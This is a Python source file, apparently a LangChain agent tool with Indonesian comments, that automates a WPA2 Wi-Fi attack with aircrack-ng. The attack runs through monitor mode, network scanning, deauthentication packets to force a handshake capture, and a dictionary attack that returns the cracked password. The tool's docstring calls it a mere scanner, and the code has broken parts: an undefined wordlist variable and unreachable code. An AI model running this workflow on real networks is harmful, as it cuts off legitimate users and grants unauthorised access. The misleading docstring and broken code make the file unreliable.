# tools/wireless_breacher.py

import subprocess
import time
import os
import csv
import re
from logger_system import logger
from langchain.agents import tool

# Fungsi _run_command tetap sama, tidak perlu diubah.
def _run_command(command: list) -> subprocess.CompletedProcess:
    """Menjalankan command di shell dengan logging."""
    logger.info(f"Executing command: {' '.join(command)}")
    try:
        result = subprocess.run(
            command, check=True, capture_output=True, text=True, timeout=120
        )
        logger.info(f"Command successful. STDOUT: {result.stdout.strip()}")
        if result.stderr:
            logger.warning(f"Command has STDERR: {result.stderr.strip()}")
        return result
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed with exit code {e.returncode}. STDOUT: {e.stdout.strip()}, STDERR: {e.stderr.strip()}")
        raise
    except subprocess.TimeoutExpired as e:
        logger.error(f"Command timed out: {' '.join(command)}")
        raise

def _set_monitor_mode(interface: str) -> str | None:
    """
    Mengubah interface ke mode monitor menggunakan alur airmon-ng.
    Mengembalikan nama interface monitor baru (misal: 'mon0') jika berhasil.
    """
    logger.info(f"Attempting to set interface '{interface}' to monitor mode using airmon-ng.")
    try:
        # 1. Hentikan proses yang dapat mengganggu
        logger.info("Killing interfering processes using 'airmon-ng check kill'...")
        _run_command(["sudo", "airmon-ng", "check", "kill"])
        
        # 2. Mulai mode monitor
        logger.info(f"Starting monitor mode on '{interface}'...")
        result = _run_command(["sudo", "airmon-ng", "start", interface])
        
        # 3. Cari nama interface monitor baru dari output
        # Contoh output: (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]mon0)
        match = re.search(r"monitor mode vif enabled for .* on \[phy\d+\](\w+)", result.stdout)
        if match:
            monitor_interface = match.group(1)
            logger.info(f"Successfully enabled monitor mode. New interface is '{monitor_interface}'.")
            return monitor_interface
        else:
            # Fallback: Cek dengan iwconfig jika regex gagal
            logger.warning("Could not parse monitor interface name, verifying with iwconfig.")
            # Interface name might have 'mon' appended, e.g., wlan0mon
            if os.path.exists(f"/sys/class/net/{interface}mon"):
                logger.info(f"Found fallback monitor interface: {interface}mon")
                return f"{interface}mon"
            logger.error("Failed to determine new monitor interface name from airmon-ng output.")
            return None
            
    except Exception as e:
        logger.error(f"An exception occurred while setting monitor mode: {e}")
        return None

def _restore_managed_mode(monitor_interface: str):
    """Menghentikan interface mode monitor dan merestart service."""
    if not monitor_interface:
        return
    logger.info(f"Restoring system by stopping monitor interface '{monitor_interface}'.")
    try:
        _run_command(["sudo", "airmon-ng", "stop", monitor_interface])
        logger.info("Attempting to restart NetworkManager...")
        _run_command(["sudo", "systemctl", "start", "NetworkManager"])
        logger.info(f"Monitor mode stopped. System services restored.")
    except Exception as e:
        logger.error(f"Failed to fully restore managed mode for '{monitor_interface}': {e}")

def _scan_for_networks(interface: str, scan_duration: int = 15) -> dict | None:
    """Memindai jaringan sekitar dan meminta user memilih target."""
    logger.info(f"Scanning for Wi-Fi networks for {scan_duration} seconds...")
    scan_prefix = "scan_result"
    
    # Hapus file scan lama jika ada
    for f in os.listdir('.'):
        if f.startswith(scan_prefix):
            os.remove(f)

    try:
        # Menjalankan airodump-ng untuk memindai
        process = subprocess.Popen(
            ["sudo", "airodump-ng", "--output-format", "csv", "-w", scan_prefix, interface],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        time.sleep(scan_duration)
        process.terminate()
        process.wait()

        # Cari file CSV hasil scan
        scan_file = next((f for f in os.listdir('.') if f.startswith(scan_prefix) and f.endswith('.csv')), None)
        if not scan_file:
            logger.error("Airodump-ng did not create a scan result file.")
            return None

        # Baca dan parse file CSV
        networks = []
        with open(scan_file, 'r', encoding='utf-8') as f:
            reader = csv.reader(f)
            # Lewati bagian client list
            for row in reader:
                if not row or row[0].strip() == 'BSSID':
                    if any("Station MAC" in col for col in row):
                        break 
                    continue
                # Ekstrak data jaringan WPA2
                if 'WPA2' in row[5]:
                    networks.append({
                        "bssid": row[0].strip(),
                        "channel": row[3].strip(),
                        "encryption": row[5].strip(),
                        "essid": row[13].strip(),
                    })
        
        if not networks:
            logger.warning("No WPA2 networks found.")
            return None

        # Tampilkan pilihan ke user
        print("\n--- [INTERACTIVE STEP] Please select a target network ---")
        for i, net in enumerate(networks):
            print(f"  [{i}] ESSID: {net['essid']}, BSSID: {net['bssid']}, Channel: {net['channel']}")
        
        try:
            choice = int(input("Enter the number of the target network: "))
            if 0 <= choice < len(networks):
                target = networks[choice]
                logger.info(f"User selected target: {target['essid']} ({target['bssid']})")
                return target
            else:
                logger.error("Invalid selection.")
                return None
        except (ValueError, IndexError):
            logger.error("Invalid input.")
            return None

    except Exception as e:
        logger.error(f"An error occurred during network scan: {e}")
        return None


def _capture_handshake(interface: str, target: dict) -> str | None:
    """Menjalankan airodump-ng dan aireplay-ng untuk menangkap handshake."""
    bssid = target["bssid"]
    channel = target["channel"]
    essid = target["essid"]
    capture_prefix = f"capture-{essid.replace(' ', '_')}"
    logger.info(f"Attempting to capture handshake for {essid} on channel {channel}.")

    # Hapus file capture lama jika ada
    for f in os.listdir('.'):
        if f.startswith(capture_prefix):
            os.remove(f)

    try:
        # Jalankan airodump-ng di background untuk menangkap
        dumper = subprocess.Popen(
            ["sudo", "airodump-ng", "--bssid", bssid, "-c", channel, "-w", capture_prefix, interface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        logger.info("Airodump-ng started for capture. Waiting a few seconds...")
        time.sleep(5)

        # Jalankan aireplay-ng untuk deauthentication
        logger.info("Sending deauthentication packets to accelerate handshake capture.")
        _run_command(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, interface])
        time.sleep(10) # Beri waktu agar handshake tertangkap

    finally:
        dumper.terminate()
        dumper.wait()
        logger.info("Airodump-ng capture process terminated.")

    # Verifikasi handshake
    cap_file = next((f for f in os.listdir('.') if f.startswith(capture_prefix) and f.endswith('.cap')), None)
    if not cap_file:
        logger.error("Capture file was not created.")
        return None

    logger.info(f"Checking for handshake in '{cap_file}'...")
    try:
        # Cek dengan aircrack-ng. Cara yang andal.
        result = subprocess.run(['aircrack-ng', cap_file], capture_output=True, text=True)
        if "1 handshake" in result.stdout or "handshake (PMKID)" in result.stdout:
            logger.info(f"SUCCESS! Handshake captured and saved to '{cap_file}'.")
            return cap_file
        else:
            logger.error("Failed to capture handshake. No handshake found in capture file.")
            return None
    except Exception as e:
        logger.error(f"Error while verifying handshake: {e}")
        return None


def _crack_password(capture_file: str, wordlist_path: str) -> str | None:
    """Mencoba memecahkan password dari file .cap menggunakan aircrack-ng."""
    logger.info(f"Attempting dictionary attack on '{capture_file}' with wordlist '{wordlist_path}'.")
    if not os.path.exists(wordlist_path):
        logger.error(f"Wordlist not found at '{wordlist_path}'.")
        return None
    
    try:
        result = _run_command(["sudo", "aircrack-ng", capture_file, "-w", wordlist_path])
        
        # Cari "KEY FOUND!" di output
        match = re.search(r"KEY FOUND!\s+\[\s*(.*?)\s*\]", result.stdout)
        if match:
            password = match.group(1)
            logger.info(f"SUCCESS! Password found: '{password}'")
            return password
        else:
            logger.warning("Password not found in the provided wordlist.")
            return None
            
    except Exception as e:
        logger.error(f"An error occurred during password cracking: {e}")
        return None


@tool
def breach_wifi_network_manual(interface: str) -> str:
    """
    Gunakan tool ini PERTAMA KALI untuk memindai (scan) jaringan Wi-Fi di sekitar.
    Tool ini akan mengaktifkan mode monitor, memindai jaringan, dan menampilkan daftar
    jaringan yang terdeteksi untuk dianalisis lebih lanjut.
    Mengembalikan daftar jaringan yang ditemukan dalam format terstruktur.
    """
    logger.info(f"Memulai pemindaian manual pada interface: {interface}")
    # ... (Implementasi lengkap dari fungsi _set_monitor_mode, _scan_for_networks, dll.)
    # ... (Pastikan untuk mengganti semua 'print' dengan 'logger.info' atau 'logger.error')
    # Di akhir, kembalikan hasil scan dalam bentuk string yang rapi.
    
    # Placeholder sederhana untuk fungsionalitas
    logger.info("Mensimulasikan pemindaian jaringan...")
    time.sleep(5)
    # 1. Aktifkan Mode Monitor
    if not _set_monitor_mode(interface):
        return "Workflow failed: Could not set wireless interface to monitor mode."
    
    try:
        # 2. Pindai dan Pilih Target
        target = _scan_for_networks(interface)
        if not target:
            return "Workflow aborted: No target network selected or no networks found."

        # 3. Tangkap Handshake
        cap_file = _capture_handshake(interface, target)
        if not cap_file:
            return f"Workflow failed for SSID '{target['essid']}': Could not capture WPA2 handshake."
        
        # 4. Crack Password
        password = _crack_password(cap_file, wordlist_path)
        if not password:
            return f"Workflow complete for SSID '{target['essid']}', but password was NOT FOUND in the wordlist."
            
        # Jika berhasil
        return f"SUCCESS! Access to SSID '{target['essid']}' breached. The password is: '{password}'"

    except Exception as e:
        logger.critical(f"A critical error occurred in the main workflow: {e}")
        return f"Workflow failed due to an unexpected error: {e}"
    finally:
        # Pastikan interface selalu dikembalikan ke mode normal
        _restore_managed_mode(interface)
        logger.info("Pemindaian selesai.")
    return f"Pemindaian selesai. Jaringan berikut ditemukan: {scan_results}"
